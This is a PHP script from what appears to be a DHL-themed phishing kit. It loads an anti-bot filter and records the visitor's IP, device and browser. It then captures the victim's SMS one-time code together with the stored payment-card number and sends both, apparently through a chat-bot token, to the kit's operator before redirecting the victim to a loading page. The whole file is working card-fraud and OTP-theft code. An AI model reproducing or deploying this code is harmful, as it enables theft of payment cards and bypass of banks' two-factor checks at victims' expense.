<?php

session_start();

include '../../config.php';
include '../../antibots/index.php';

include '../functions.php';
$TIME = date("d/m/Y");
$ip = $_SERVER['REMOTE_ADDR'];
get_user_ipinfo($ip);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$os_plat = getOS($user_agent);
$browser = getBrowser();


if ($_POST['sim_err'] != "") {

    $sim_code_err = $_POST['sim_err'];



    $Message_SMS_err = "
    💳 ━━━━━━━━━━━━ 💳
    SMS OTP code: 
    SMS Code Error: `$sim_code_err`
    Card:  " . $_SESSION['ccnumber-zbi'] . "
    IP: `$ip`
    IPcountry: $countryy - $country_code
    Time: $TIME
    Device: $os_plat - $browser
    💳 ━━━━━━━━━━━━ 💳
    🃏 DHL V3 by  🃏";

    sendMessage($ChatId, $Message_SMS_err, $BotToken);


} 

if ($unlimited_SMS == "1") {
    header('location: ../loading_3.php');
}else {
    header('location: ../loading_end.php');
}

?>